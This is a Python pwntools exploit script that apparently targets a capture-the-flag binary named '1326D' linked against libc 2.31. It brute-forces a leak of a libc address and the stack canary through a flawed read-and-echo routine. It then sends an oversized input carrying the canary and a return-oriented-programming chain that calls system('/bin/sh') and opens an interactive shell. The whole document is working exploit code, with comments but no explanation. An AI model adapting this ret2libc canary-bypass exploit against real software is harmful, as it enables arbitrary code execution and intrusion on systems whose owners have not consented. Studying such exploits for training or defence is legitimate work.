from pwn import *

#init

e = ELF('./1326D')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#funcs

def leak(x, y):
    #use bad read func and problem output to brute leak without overwrite by creating its reverse at the prefix
    s = b''
    log.info('Leaking ' + str(x) + ' chars at offset: ' + hex(y))
    for i in range(x):
        for j in range(1, 256):
            if j == ord('\0') or j == ord('\n') or j == ord('a'):
                continue

            p.sendline((s + bytes([j]) + b'#' * 0x100).ljust(y, b'a'))

            if len(p.recvline(keepends = False)) == 2 * (i + 1) + 0x100:
                s += bytes([j])
                break

        log.info(str(i + 1) + ' chars leaked: ' + s.hex())

    return s

#vars

setbuf_off = libc.sym['setbuffer']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Setbuff libc off: ' + hex(setbuf_off))
log.info('Binsh libc off: ' + hex(binsh_off))

#exploit

#use lots of tests for brute forces

p.sendline('10000')

#brute leak libc

libc_off = u64(leak(5, 1000071)[::-1] + b'\x7f\x00\x00') - setbuf_off - 200

log.info('Libc off adr: ' + hex(libc_off))

#brute leak canary

canary = u64(b'\x00' + leak(12, 1000104)[-1:-8:-1])

log.info('Canary: ' + hex(canary))

#rop system('/bin/sh')

libc.address = libc_off
rop = ROP(libc)
rop.system(libc_off + binsh_off)

p.sendline(b'#' + b'a' * 1000103 + p64(canary) + b'a' * 0x8 + rop.chain())

#pray for flag

p.interactive()
